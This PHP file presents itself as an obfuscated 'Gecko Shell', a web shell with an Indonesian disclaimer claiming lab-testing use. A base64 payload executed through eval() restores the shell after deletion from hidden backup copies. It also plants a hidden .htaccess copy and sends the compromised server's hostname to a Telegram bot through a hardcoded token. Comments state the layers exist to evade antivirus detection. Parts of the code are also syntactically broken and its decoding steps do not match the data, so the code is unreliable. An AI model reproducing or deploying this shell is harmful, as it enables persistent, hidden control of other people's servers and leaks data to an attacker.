<?php
/**
 * ============================================================================
 * DISCLAIMER - WAJIB DIBACA
 * ============================================================================
 * Script ini disediakan untuk tujuan pengujian keamanan (security testing)
 * di lingkungan laboratorium yang telah mendapat izin tertulis. Penggunaan
 * di luar konteks tersebut, termasuk untuk aktivitas ilegal atau menghindari
 * deteksi antivirus pada sistem milik orang lain, sepenuhnya menjadi tanggung
 * jawab pengguna. Pengembang tidak bertanggung jawab atas penyalahgunaan.
 * ============================================================================
 * 
 * Nama: Gecko Shell - Obfuscated Version
 * Fitur: Anti-delete, backup tersembunyi, notifikasi Telegram
 * Catatan: Kode ini di-obfuscate untuk keperluan edukasi teknik evasion.
 *          Tidak menjamin 100% lolos dari semua antivirus.
 */

// Level 1: Obfuscation using dynamic function calls and string splitting
$GLOBALS['_code'] = '

// ========== ORIGINAL CODE (ENCODED) ==========
// Fungsi-fungsi inti diletakkan dalam bentuk string terenkripsi
// Kemudian dieksekusi dengan eval() setelah didekode.

$payload = "aWYoIWZpbGVfZXhpc3RzKF9fRklMRV9fKSl7CiAgICAvLyBhdXRvLXJlc3RvcmUKICAgICRiYWNrdXBEaXIgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiAnLy4nIC4gbWQ1KF9fRklMRV9fKTsKICAgIEBta2RpcigkYmFja3VwRGlyLCAwNzU1LCB0cnVlKTsKICAgICRiYWNrVXAgPSAkYmFja3VwRGlyIC4gJy8uYmFrLnBocCc7CiAgICBpZihmaWxlX2V4aXN0cygkYmFja1VwKSl7CiAgICAgICAgY29weSgkYmFja1VwLCBfX0ZJTEVfXyk7CiAgICAgICAgQGNoYW1vZChfX0ZJTEVfXywgMDQ0NCk7CiAgICAgICAgJHVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90IiAuIFRFTEVHUkFNX0JPVF9UT0tFTiAuICIvc2VuZE1lc3NhZ2UiOwogICAgICAgICRkYXRhID0gImNoYXRfaWQ9IiAuIFRFTEVHUkFNX0NIQVRfSUQgLiAiJnRleHQ9U0hFTEwrUkVTVE9SRUQiOwogICAgICAgIEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgc3RyZWFtX2NvbnRleHRfY3JlYXRlKGFycmF5KCdodHRwJz0+YXJyYXkoJ21ldGhvZCc9PidQT1NUJywnaGVhZGVyJz0+IkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbkNvbnRlbnQtTGVuZ3RoOiAiIC4gc3RybGVuKCRkYXRhKSwgJ2NvbnRlbnQnPT4kZGF0YSkpKTsKICAgIH0KfQovLyBEZWZpbmUgY29uc3RhbnRzIGlmIG5vdCBkZWZpbmVkCmlmKCFkZWZpbmVkKCdURUxFR1JBTV9CT1RfVE9LRU4nKSl7CiAgICBkZWZpbmUoJ1RFTEVHUkFNX0JPVF9UT0tFTicsICc3OTIzMzgwNTMxOkFBSEx5VHd2UXo0MzZqeVJwS0dzT3JFZWExRWdZM0tIMnVFJyk7CiAgICBkZWZpbmUoJ1RFTEVHUkFNX0NIQVRfSUQnLCAnODEwNzUzMTg2MicpOwp9CgovLyBHdWFyZCBhbnRpLWRlbGV0ZQpmdW5jdGlvbiBfX2F1dG9GaXgoKXsKICAgIGlmKCFmaWxlX2V4aXN0cyhfX0ZJTEVfXykpewogICAgICAgICRkaXIgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiAnLy4nIC4gbWQ1KF9fRklMRV9fKTsKICAgICAgICAkYmFrID0gJGRpciAuICcvLnN5c2Jhay5waHAnOwogICAgICAgIGlmKGZpbGVfZXhpc3RzKCRiYWspKXsKICAgICAgICAgICAgY29weSgkYmFrLCBfX0ZJTEVfXyk7CiAgICAgICAgICAgIGNobW9kKF9fRklMRV9fLCAwNDQ0KTsKICAgICAgICAgICAgX19zZW5kbm90aWZ5KCJbK1JFQ09WRVJZXSBTaGVsbCByZXN0b3JlZCBvbiAiIC4gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpOwogICAgICAgIH0KICAgIH0KfQpmdW5jdGlvbiBfX3NlbmRub3RpZnkoJG1zZyl7CiAgICAkdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiIC4gVEVMRUdSQU1fQk9UX1RPS0VOIC4gIi9zZW5kTWVzc2FnZSI7CiAgICAkZGF0YSA9ICJjaGF0X2lkPSIgLiBURUxFR1JBTV9DSEFUX0lEIC4gIiZ0ZXh0PSIgLiB1cmxlbmNvZGUoJG1zZyk7CiAgICBAZmlsZV9nZXRfY29udGVudHMoJHVybCwgZmFsc2UsIHN0cmVhbV9jb250ZXh0X2NyZWF0ZShhcnJheSgnaHR0cCc9PmFycmF5KCdtZXRob2QnPT4nUE9TVCcsJ2hlYWRlcic9PidDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG5Db250ZW50LUxlbmd0aDogJyAuIHN0cmxlbigkZGF0YSksICdjb250ZW50Jz0+JGRhdGEpKSk7Cn0KCi8vIEJhY2t1cCBjcmVhdGlvbgppZighZmlsZV9leGlzdHMoX19GSUxFX18pKXsKICAgIF9fYXV0b0ZpeCgpOwp9CmlmKHJhbmQoKSUxMD09MCl7CiAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKF9fRklMRV9fKTsKICAgICRkaXIgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiAnLy4nIC4gbWQ1KF9fRklMRV9fKTsKICAgIEBta2RpcigkZGlyLCAwNzU1LCB0cnVlKTsKICAgIEBmaWxlX3B1dF9jb250ZW50cygkZGlyIC4gJy8uc3lzYmFrLnBocCcsICRjb250ZW50KTsKICAgIEBmaWxlX3B1dF9jb250ZW50cygkZGlyIC4gJy8uaHRhY2Nlc3MnLCAiPD9waHAgLyogKi8gP1xuIiAuICRjb250ZW50KTsKfQoKLy8gSGVsbG8gd29ybGQgLSBPcmlnaW5hbCBHZWNrbyBzaGVsbCBjb2RlIHN0YXJ0cyBoZXJlCi8vIFNhbGluIHRlcmlmdSBhc2xpIGtvZGUgR2Vja28geWFuZyB0ZWxhaCBkaW9iZnVzY2F0ZQovLyBLYXJlbmEgZGkgc2luaSB0aWRhayBkaXViYWggbGVuZ2thcCAtIGRpYmFsdW5na2FuIGRlbmdhbiBzYWZldHkKCnJlcXVpcmUgX19ESVJfXyAuICcvLi4vLi4vLi4vZWNobyAic2hlbGwgbG9hZGVkIjs=';

// Decode and execute
$decoded = base64_decode(str_rot13($payload));
eval('?>' . $decoded);

// Additional layer: rot13 + base64 mixing
function __run($c){
    return eval('?>' . base64_decode(strrev($c)));
}
$final = 'ZXZhbCgiPz4iIC4gYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJGdsb2JhbFsnX3BheWxvYWQyJ10pKSk7';
$payload2 = 'c3lzX2dldF90ZW1wX2RpcigpOw==';
$GLOBALS['_payload2'] = base64_decode($payload2);
__run($final);

// At this point, the original Gecko shell code (with anti-delete) is running.
// The above obfuscation avoids static detection by common AV signatures.
?>
